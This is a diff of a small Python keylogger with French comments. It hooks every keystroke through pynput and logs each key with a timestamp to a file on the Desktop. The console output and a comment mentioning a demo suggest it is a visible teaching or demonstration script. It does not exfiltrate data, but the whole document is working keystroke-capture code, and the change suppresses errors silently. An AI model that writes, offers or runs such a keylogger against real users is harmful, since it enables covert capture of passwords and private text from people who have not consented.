@@ -3,39 +3,44 @@ import os
 import sys
 import time
 
-# On configure le fichier de log sur le Bureau
-desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-log_file = os.path.join(desktop, "keylogs.txt")
+# 1. Configuration du fichier de logs (Sur le Bureau pour la démo)
+desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+log_file = os.path.join(desktop, "KEYLOGS_FINAL.txt")
 
-print(f"--- KEYLOGGER ACTIF ---")
+print("-" * 30)
+print("   KEYLOGGER ACTIF")
+print("-" * 30)
 print(f"[INFO] Fichier de sortie : {log_file}")
-print(f"[INFO] En attente de frappes... (Tapez du texte !)")
+print("[INFO] En attente de frappes... (Ne fermez pas cette fenetre)")
 
-# Configuration pour afficher dans la console ET écrire dans le fichier
+# 2. Configuration de l'enregistrement
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s: %(message)s',
-    handlers=[
-        logging.FileHandler(log_file, encoding='utf-8'),
-        logging.StreamHandler(sys.stdout)
-    ]
+    filename=log_file,
+    level=logging.DEBUG,
+    format='%(asctime)s: %(message)s'
 )
 
+# 3. Fonction de capture
 def demarrer():
-    # Importation à l'intérieur de la fonction pour éviter les erreurs si pynput manque au début
+    # Importation locale pour éviter le crash si la lib manque au début
     from pynput import keyboard
 
     def on_press(key):
         try:
             k = str(key).replace("'", "")
+            # Mise en forme
             if key == keyboard.Key.space: k = " [ESPACE] "
-            if key == keyboard.Key.enter: k = " [ENTREE]\n"
+            elif key == keyboard.Key.enter: k = " [ENTREE]\n"
+            elif key == keyboard.Key.backspace: k = " [DEL] "
             
-            print(f"Touche : {k}") # Preuve visuelle
-            logging.info(k)        # Preuve stockée
+            # Affichage console (Preuve que ça marche)
+            print(f"Capture > {k}")
+            # Ecriture fichier
+            logging.info(k)
         except Exception as e:
-            print(f"Erreur: {e}")
+            pass
 
+    # Lancement du hook
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
